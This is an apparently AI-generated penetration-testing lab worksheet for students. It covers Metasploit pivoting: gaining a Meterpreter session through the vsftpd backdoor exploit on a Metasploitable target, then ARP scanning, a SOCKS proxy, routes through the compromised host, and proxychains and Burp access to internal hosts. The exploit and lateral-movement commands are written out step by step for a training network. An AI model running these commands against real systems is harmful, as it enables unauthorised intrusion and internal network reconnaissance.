# ** **

### _Week 06 — MITM, Proxying, Tunneling, Traffic Manipulation_

**Estimated Time:** 90–120 minutes  
**Difficulty:** Intermediate → Advanced  
**Tools:** Metasploit Framework, Meterpreter, SSH (optional), Burp Suite (optional), internal lab network

---

## **1. Purpose of This Lab**

This lab introduces **pivoting** using Metasploit’s built‑in SOCKS proxy capabilities.  
Students learn how to:

- Establish a Meterpreter session
- Enable Metasploit’s SOCKS4a proxy
- Route traffic through a compromised host
- Perform internal reconnaissance through the pivot
- Use proxychains or Burp Suite to access internal services
- Understand the fundamentals of lateral movement

This is the student’s first exposure to **post‑exploitation pivoting**, which becomes essential in Weeks 8–9.

---

## **2. Pre‑Lab Requirements**

Students must have:

- A reachable vulnerable machine (e.g., Metasploitable 2 or 3)
- A working exploit that provides a Meterpreter session
- At least one internal host reachable **only** from the compromised machine
- Completed Lab 6.2 (SSH tunneling) for conceptual grounding

Example topology:

```
Kali → (exploit) → Metasploitable → Internal Host (10.10.10.x)
```

---

## **3. Lab Tasks**

---

# **Task 1 — Obtain a Meterpreter Session**

### **Objective**

Establish a foothold on a vulnerable machine.

### **Steps**

1. Launch Metasploit:
    
    ```
    msfconsole
    ```
    
2. Use any known exploit for your target (example):
    
    ```
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS 192.168.20.30
    run
    ```
    
3. Confirm a Meterpreter session:
    
    ```
    sessions -i 1
    ```
    

### **What to Observe**

- Meterpreter prompt
- Ability to run basic commands (`sysinfo`, `ifconfig`)

### **Deliverable**

A note confirming the active Meterpreter session.

---

# **Task 2 — Identify Internal Network Reachability**

### **Objective**

Determine what the compromised host can see that Kali cannot.

### **Steps**

From Meterpreter:

```
run arp_scanner -r 10.10.10.0/24
```

Or:

```
shell
ping 10.10.10.5
```

### **What to Observe**

- Internal hosts responding to ARP or ping
- Hosts unreachable from Kali

### **Deliverable**

A list of internal IPs reachable from the compromised machine.

---

# **Task 3 — Enable Metasploit’s SOCKS Proxy**

### **Objective**

Create a pivot point through the compromised host.

### **Steps**

In Metasploit:

```
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 1080
run
```

### **What to Observe**

- SOCKS proxy starts on port 1080
- Metasploit logs confirm proxy is active

### **Deliverable**

A note confirming the SOCKS proxy is running.

---

# **Task 4 — Add a Route Through the Compromised Host**

### **Objective**

Tell Metasploit to route internal traffic through the Meterpreter session.

### **Steps**

Identify the session ID:

```
sessions
```

Add a route:

```
route add 10.10.10.0/24 1
```

(Replace `1` with your session ID.)

### **What to Observe**

- Metasploit now knows to send traffic for 10.10.10.x through the compromised host

### **Deliverable**

A screenshot or note showing the route table:

```
route print
```

---

# **Task 5 — Test Pivoting Using Proxychains**

### **Objective**

Use the SOCKS proxy to reach internal hosts from Kali.

### **Steps**

Edit `/etc/proxychains.conf`:

```
socks4  127.0.0.1 1080
```

Test internal connectivity:

```
proxychains nmap -sT 10.10.10.5
```

### **What to Observe**

- Nmap traffic is routed through the compromised host
- Internal hosts respond
- Kali still cannot reach them directly

### **Deliverable**

A note confirming successful internal scanning through the pivot.

---

# **Task 6 — Access Internal Web Apps Through the Pivot (Optional but Recommended)**

### **Objective**

Use Burp Suite to browse internal services through the pivot.

### **Steps**

1. Configure Burp → User Options → SOCKS Proxy:
    - Host: `127.0.0.1`
    - Port: `1080`
    - Version: SOCKS4a
2. Visit an internal site:
    
    ```
    http://10.10.10.5:8080
    ```
    

### **What to Observe**

- Burp logs the request
- The internal app loads
- Traffic flows through the compromised host

### **Deliverable**

A list of internal endpoints discovered through Burp.

---

# **Task 7 — Validate Pivot Failure Modes**

### **Objective**

Understand what happens when the pivot breaks.

### **Steps**

1. Kill the Meterpreter session:
    
    ```
    sessions -K
    ```
    
2. Attempt to run:
    
    ```
    proxychains nmap 10.10.10.5
    ```
    
3. Observe failure.
4. Re‑establish the session and route.

### **What to Observe**

- Pivoting depends entirely on the Meterpreter session
- Routes disappear when the session dies
- SOCKS proxy remains active but unusable

### **Deliverable**

A short explanation of pivot dependency and recovery steps.

---

## **4. Completion Criteria**

A student has successfully completed Lab 6.3 when they can:

- Establish a Meterpreter session
- Identify internal hosts reachable only from the compromised machine
- Enable Metasploit’s SOCKS proxy
- Add routes for pivoting
- Use proxychains to scan internal networks
- Access internal web apps through Burp
- Diagnose pivot failures

---

## **5. Next Steps**

When you’re ready, say:

**“Next lab.”**

And I’ll generate **Lab 6.4 — Invisible MITM with Burp Suite** in the same course style.